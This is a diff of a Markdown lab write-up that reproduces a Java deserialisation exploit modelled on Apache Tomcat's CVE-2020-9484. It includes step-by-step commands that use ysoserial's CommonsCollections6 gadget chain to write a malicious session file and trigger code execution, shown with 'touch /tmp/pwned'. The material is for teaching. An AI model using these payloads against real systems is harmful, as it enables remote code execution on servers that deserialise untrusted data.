@@ -8,6 +8,8 @@ This laboratory example emulates CVE-2020-9484, in which Apache Tomcat’s Persi
 
 The minimal sink is a single unfiltered readObject() on a session file (Listing~X). Exploitation needs no flaw in the application’s own classes. Using ysoserial, an attacker serialises a CommonsCollections6 gadget chain that embeds an operating-system command, here touch /tmp/pwned, and writes the result as a .session file; in the lab this is placed directly, while in CVE-2020-9484 a ../ session identifier redirected the store to an uploaded file. When the application reloads that session, readObject() rebuilds the object graph and the chain executes during reconstruction, before any value is returned (Figure~X). The dropped /tmp/pwned file confirms arbitrary execution. Because the command runs with the JVM’s privileges, impact is complete: confidentiality, integrity and availability are all lost. The application never references Commons Collections; its presence on the classpath suffices.
 
+![alt text](Images/successfuldeserealisationexploit.png)
+
 ## Identifying the Vulnerability Using Techniques and Tools
 
 ## How to Mitigate the Vulnerability
@@ -16,7 +18,7 @@ The minimal sink is a single unfiltered readObject() on a session file (Listing~
 
 ---
 
-# Supplementary example information
+# Supplementary Information
 
 ## Prerequisites
 
@@ -25,7 +27,7 @@ The minimal sink is a single unfiltered readObject() on a session file (Listing~
   `--add-opens` flags, and is less predictable.
 - Maven 3.8+
 - Internet access on first build (to fetch `commons-collections:3.1` and ysoserial)
-- A disposable Linux VM/container
+- A disposable Linux VM/container (used 24.4.04)
 
 ---
 
@@ -53,40 +55,49 @@ exact same `load` path.
 
 ## Exploiting the Application
 
-### Install ysoserial
+### Setting up the Ubuntu VM
 
 ```bash
-git clone https://github.com/frohoff/ysoserial.git
-cd ysoserial
-mvn clean package -DskipTests        # -> target/ysoserial-<ver>-SNAPSHOT-all.jar
-cd ..
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y openjdk-11-jdk maven git unzip
 ```
 
-### Generate a malicious session file
-
-On JDK 8:
+### Pinning toolchain to JDK 11
 
 ```bash
-java -jar ysoserial/target/ysoserial-*-all.jar \
-     CommonsCollections6 "touch /tmp/pwned" > sessions/evil.session
+echo 'export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64' >> ~/.bashrc
+echo 'export PATH=$JAVA_HOME/bin:$PATH' >> ~/.bashrc
+source ~/.bashrc
 ```
 
-On JDK 11+ ysoserial itself needs reflection opened up:
+### Verifying Java Versions
 
 ```bash
-java --add-opens java.base/java.util=ALL-UNNAMED \
-     --add-opens java.base/java.lang=ALL-UNNAMED \
-     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
-     -jar ysoserial/target/ysoserial-*-all.jar \
-     CommonsCollections6 "touch /tmp/pwned" > sessions/evil.session
+java -version      # openjdk 11...
+javac -version     # javac 11...   
+mvn -version       # Java version: 11...
 ```
 
-### Firing the exploit through the vulnerable sink
+### Running the Exploit
+
+This assumes that both ysoserial and the lab sit in the Documents directory.
 
 ```bash
-rm -f /tmp/pwned
-java -jar target/deser-lab.jar load evil
-ls -l /tmp/pwned        # the file exists -> arbitrary command executed = RCE
+LAB=~/Documents/"2 Unsafe Java Deserialisation or Software Integrity"
+YSO=/home/testmachine/Documents/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
+
+cd "$LAB"
+mkdir -p sessions
+java -jar "$YSO" CommonsCollections6 "touch /tmp/pwned" > "$LAB/sessions/evil.session"
+
+ls -l sessions/evil.session     
+
+# Running the attack
+
+  cd "$LAB"
+  rm -f /tmp/pwned
+  java -jar target/deser-lab.jar load evil
+  ls -l /tmp/pwned        # file present → RCE confirmed
 ```
 
 From the application perspective, a session is being loaded. Before any application logic is applied, the command is run during `readObject()` by the gadget chain.
